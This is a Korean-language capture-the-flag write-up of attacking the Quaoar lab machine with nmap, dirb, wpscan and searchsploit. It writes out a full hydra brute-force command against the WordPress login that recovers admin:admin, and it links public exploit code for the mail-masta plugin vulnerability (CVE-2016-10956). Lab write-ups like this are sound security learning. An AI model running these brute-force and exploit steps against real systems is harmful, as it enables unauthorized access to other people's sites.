# CTF\_Quaoar

{% stepper %}
{% step %}
### nmap

명령어:

{% code title="명령" %}
```
```
{% endcode %}

```bash
nmap 192.168.56.0/24
```

이미지:&#x20;
{% endstep %}

{% step %}
### 웹 접속

브라우저로 접속한 화면들:&#x20;

* 클릭 시 이미지를 보여주는 기능이 동작 중이다.
{% endstep %}
{% endstepper %}

### dirb

* 추가로 접속 가능한 페이지가 있는지 탐색하기 위해 명령어 실행:

{% code title="명령" %}
```
```
{% endcode %}

```bash
dirb http://192.168.56.116/
```

* 발견된 엔드포인트 및 결과:
  * http://192.168.56.116/robots<br>
  * http://192.168.56.116/wordpress/index.php<br>
  * http://192.168.56.116/wordpress/index/\
    (!) WARNING: NOT\_FOUND\[] not stable, unable to determine correct URLs {30X}.\
    (Try using FineTunning: '-f')
  * http://192.168.56.116/wordpress/readme<br>
  * http://192.168.56.116/wordpress/wp-admin/
  *   http://192.168.56.116/wordpress/wp-links-opml

      ```
      This XML file does not appear to have any style information associated with it. The document tree is shown below.  

      <opml version="1.0">

      <head>

      <title>Links for Quaoar</title>

      <dateCreated>Wed, 02 Oct 2024 10:52:13 GMT</dateCreated>

      <!-- generator="WordPress/3.9.14" -->

      </head>

      <body> </body>

      </opml>
      ```
  * http://192.168.56.116/upload/include/yui/README
  * http://192.168.56.116/wordpress/wp-admin/
  * http://192.168.56.116/upload/include/yui/event/event
  * http://192.168.56.116/upload/include/yui/event/README
  * http://192.168.56.116/upload/include/yui/yahoo/README
  * http://192.168.56.116/upload/include/yui/yahoo/yahoo

### wpscan

* 스캔 결과 (이미지):&#x20;
* 메일 관련 플러그인 발견

### searchsploit

* 발견된 익스플로잇 (이미지):&#x20;
* 메일 관련 플러그인에 취약점 확인&#x20;

로그인 정보를 얻기 위해 브루트포스 공격 실행.

프록시를 설정해 로그인 시 페이지와 주고받는 데이터 확인:&#x20;

post 데이터를 활용한 브루트포스 시도:

{% code title="hydra 명령" %}
```
```
{% endcode %}

\`\`\`bash hydra 192.168.56.116 http-form-post "/wordpress/wp-login.php:log=^USER^\&pwd=^PASS^\&wp-submit=Log+In\&redirect\_to=%2Fwordpress%2Fwp-admin%2F\&testcookie=1:Lost your password" -l admin -P ./weakpass.txt \`\`\` - 결과: admin:admin 확인 !\[]\(../assets/images/Pasted%20image%2020241002125000.png) !\[]\(../assets/images/Pasted%20image%2020241002125106.png)

플러그인 관련 취약점을 활용한 소스코드 다운로드: https://github.com/p0dalirius/CVE-2016-10956-mail-masta

실행 결과:  &#x20;

* wp-admin으로 SSH 접속을 시도했으나 취약한 비밀번호는 사용하지 않는 것으로 보임.
* 웹 셸을 이용한 시스템 접근 시도는 차단된 것으로 보임.&#x20;

mail-masta를 활용한 익스플로잇을 조사하던 중 유용한 깃허브 소스 발견: https://github.com/Hackhoven/wp-mail-masta-exploit

* sql 인젝션을 통해 얻은 계정 및 패스워드를 바로 사용함.  &#x20;
